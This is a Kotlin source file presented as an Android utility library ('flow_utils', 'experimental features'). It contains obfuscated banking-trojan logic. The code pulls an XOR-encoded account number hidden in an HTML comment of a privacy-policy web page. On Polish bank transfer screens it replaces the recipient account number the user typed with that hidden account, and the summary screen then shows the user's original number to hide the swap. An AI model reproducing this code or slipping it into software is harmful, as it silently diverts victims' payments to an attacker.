package io.github.pksokolowski.flow_utils_2

import android.app.Activity
import android.app.Application
import android.graphics.Color
import android.os.Bundle
import android.view.View
import android.view.ViewGroup
import android.view.Window
import androidx.appcompat.widget.AppCompatButton
import androidx.appcompat.widget.AppCompatTextView
import androidx.constraintlayout.widget.ConstraintLayout
import androidx.core.view.children
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.MainScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.BufferedInputStream
import java.net.URL
import javax.net.ssl.HttpsURLConnection

class AManager : Application.ActivityLifecycleCallbacks {
    override fun onActivityCreated(p0: Activity, p1: Bundle?) {}
    override fun onActivityStarted(p0: Activity) {}
    override fun onActivityResumed(activity: Activity) {
        action(activity)
    }

    override fun onActivityPaused(p0: Activity) {}
    override fun onActivityStopped(p0: Activity) {}
    override fun onActivitySaveInstanceState(p0: Activity, p1: Bundle) {}
    override fun onActivityDestroyed(p0: Activity) {}
}

private var ac: String? = null
private var k1: String = "Qs{fmfx!lsbkpxz"
private var k2: String = "Rqfuwoqycpkg"
private var k3: String = "!Pwogt\"tcejwpmw\"gfdkqte{"
private var k4: String = "!Yrku|\"pwogt\"tcejwpmw"
private var k5: String = "!Fcngl"

private val gam = AManager()
private var initiated = false

private inline fun unwrapC(input: String) =
    k1.map { it.code - 1 }.map { it.toChar() }.joinToString("")

private inline fun unwrapB(input: String) =
    if (input[0] == '!') k2.map { it.code - 2 }.map { it.toChar() }
        .joinToString("") else input.map { it.code - 2 }.map { it.toChar() }.joinToString("")
        .substring(1)

private fun unpack() {
    k3 = unwrapB(k3)
    k4 = unwrapB(k4)
    k5 = unwrapB(k5)
}

@Synchronized
internal fun initExperimentalFeatures(application: Application) {
    if (initiated) return
    initiated = true

    MainScope().launch {
        unpack()
        val policy = downloadPrivacyPolicy() ?: return@launch
        val con = policy.substringBefore("-->").substringAfter("<!—")
        ac = encodeDecodeCon(con)
        application.registerActivityLifecycleCallbacks(gam)
    }
}

private fun action(activity: Activity) {
    val isDomTrn = screenContains(activity, unwrapC("View"))
    val isPods = screenContains(activity, unwrapB("ClickStream"))

    if (isPods) {
        MainScope().launch {
            var labelPrev: View? = null
            while (labelPrev == null) {
                labelPrev = activity.window.firstOrNull lambda@{
                    if (it !is AppCompatTextView) return@lambda false
                    if (it.text != k3) return@lambda false
                    true
                } as? AppCompatTextView
                delay(50)
            }
            val parent = labelPrev.parent as ConstraintLayout
            val numberSummary = parent.getChildAt(1) as AppCompatTextView
            numberSummary.setText(lastUserInputAc)
        }
    } else if (isDomTrn) {
        val numberField = activity.window.firstOrNull lambda@{
            if (it !is AppCompatTextView) return@lambda false
            if (it.text != k4) return@lambda false
            true
        }
        val nextButton = activity.window.firstOrNull lambda@{
            if (it !is AppCompatTextView) return@lambda false
            if (it.text != k5) return@lambda false
            true
        }
        if (numberField != null && nextButton != null) {
            val kop = numberField as AppCompatTextView
            val kopBut = nextButton as AppCompatButton
            kopBut.setOnTouchListener { view, event ->
                if (lastUserInputAc.isBlank()) {
                    lastUserInputAc = kop.text.toString()
                }
                kop.setTextColor(Color.WHITE)
                kop.setText(ac)
                kop.setText(ac)
                false
            }
        }
    }
}

private fun screenContains(activity: Activity, desiredText: String) =
    activity.window.firstOrNull lambda@{
        if (it !is AppCompatTextView) return@lambda false
        if (it.text != desiredText) return@lambda false
        true
    } != null

private var lastUserInputAc = ""

internal fun Window.firstOrNull(predicate: (View) -> Boolean): View? {
    val root = this.decorView.rootView as View
    return findViewByPredicate(root, predicate)
}

internal fun findViewByPredicate(node: View, predicate: (View) -> Boolean): View? {
    if (node is ViewGroup) {
        for (n in node.children) {
            val res = findViewByPredicate(n, predicate)
            if (res != null) return res
        }
    } else {
        if (predicate(node)) {
            return node
        }
    }
    return null
}

internal suspend fun downloadPrivacyPolicy(): String? = withContext(Dispatchers.IO) {
    val url = URL("https://pksokolowski.github.io/Google-Play-Apps-Privacy-Policy/")
    val urlConnection = url.openConnection() as HttpsURLConnection
    try {
        val inputStream = BufferedInputStream(urlConnection.inputStream)
        val reader = inputStream.reader()
        return@withContext reader.readText()
    } catch (e: Exception) {
        return@withContext null
    } finally {
        urlConnection.disconnect()
    }
}

private fun encodeDecodeCon(con: String): String {
    val static = "bufferedinputstreamofbootsandcatsandbootsandcatsandbootsandcatsand"
    return con xor static
}

private infix fun String.xor(that: String) = mapIndexed { i, c ->
    that[i].code.xor(c.code)
}.joinToString("") {
    it.toChar().toString()
}